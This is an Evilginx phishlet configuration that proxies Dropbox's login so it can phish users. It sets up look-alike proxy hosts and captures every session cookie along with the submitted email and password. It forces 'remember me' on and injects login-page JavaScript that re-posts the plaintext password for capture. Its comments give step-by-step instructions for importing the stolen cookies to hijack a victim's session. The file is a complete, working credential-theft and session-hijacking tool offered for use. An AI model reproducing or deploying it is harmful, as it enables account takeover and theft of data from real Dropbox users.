author: '@an0nud4y'
min_ver: '2.3.0'

proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'dropbox.com', session: true, is_landing: true}
  - {phish_sub: 'dropbox-api', orig_sub: 'dropbox-api', domain: 'arkoselabs.com', session: false, is_landing: false}
  - {phish_sub: 'client-api', orig_sub: 'client-api', domain: 'arkoselabs.com', session: false, is_landing: false}
  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'arkoselabs.com', session: false, is_landing: false}

sub_filters:
  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'dropbox.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'cfl', domain: 'dropboxstatic.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'dropbox-api', domain: 'arkoselabs.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'client-api', domain: 'arkoselabs.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'cdn', domain: 'arkoselabs.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}

auth_tokens:
  - domain: 'dropbox.com'
    keys: ['.*,regexp']
  - domain: '.dropbox.com'
    keys: ['.*,regexp']
  - domain: 'www.dropbox.com'
    keys: ['.*,regexp']    
  - domain: '.www.dropbox.com'
    keys: ['.*,regexp']
auth_urls:
  - '/h'
  - '/h/.*'   
  
# METHODS TO IMPORT COOKIES AND GETTING SESSION  
  
#METHOD - 1

# Open Chrome/Firefox browser goto Developer tools > Application/Storage > Cookies
# Now Open www.dropbox.com in tab.
# Install Cookie Editor(https://cookie-editor.cgagnier.ca/)
# From Developer Tools Remove All Cookies From all domains (whatever domains storing cookies during visiting www.dropbox.com)
# Get All Captured Cookies From Evilginx and Import them From Cookie-Editor.
# Now Check For cookie name "__Host-js_csrf" and check its value from the developer tools and compare with the value of cookies in evilginx.
# If Values are not same , repeat above process again.
# If Values are Same then visit to this address in same tab. www.dropbox.com/h

# You Should have Got session, If Not Repeat All Process Again or Follow Method-2(Below)

  
#METHOD - 2  

# MODIFY COOKIES FORMAT--
# 1) Copy All Cookies from Evilginx Panel.
# 2) Check For Expiration Date And Replace to "Expires raw", Like -->  "expirationDate":1649315104   to  "Expires raw": "1649315104", in cookies(original).
# 3) Similarly Change the Value of All respectictive cookies.
# 4) Then Use this firefox extension to inject these cookies manually. (https://github.com/ysard/cookie-quick-manager/)

#INJECT THESE COOKIES --
# 1) OPEN BROWSER WITH HOMEPAGE
# 2) INJECT ALL CAPTURED COOKIES USING THIS EXTENSION
# 3) GOTO ADDRESS : https://www.dropbox.com/h  
# 4) YOU SHOULD HAVE GOT SESSION, IF NOT REPEAT PROCESS WITH OTHER INJECTION METHOD(try using console) FOR COOKIES


credentials:
  username:
    key: 'login_email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'login_password_unenc'
    search: '(.*)'
    type: 'post'

login:
  domain: 'www.dropbox.com'
  path: '/login'

force_post:
  - path: '/ajax_login'
    force:
      - {key: 'remember_me', value: 'true'}
    type: 'post'

js_inject:
  - trigger_domains: ["www.dropbox.com"]
    trigger_paths: ["/login"]
    trigger_params: []
    script: |
      function onclickListener(){
        var submit = document.querySelectorAll('button[type=submit]')[0];
        submit.setAttribute("onclick", "sendPass()");
        return;
      }
      function sendPass(){
        var password = document.getElementsByName("login_password")[0].value;
        if (!password) password = document.getElementsByName("login_password")[1].value;
        var xhr = new XMLHttpRequest();
        xhr.open("POST", '/ajax_login', true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send("login_password_unenc="+encodeURIComponent(password));
        return;
      }
      setTimeout(function(){ onclickListener(); }, 1000);


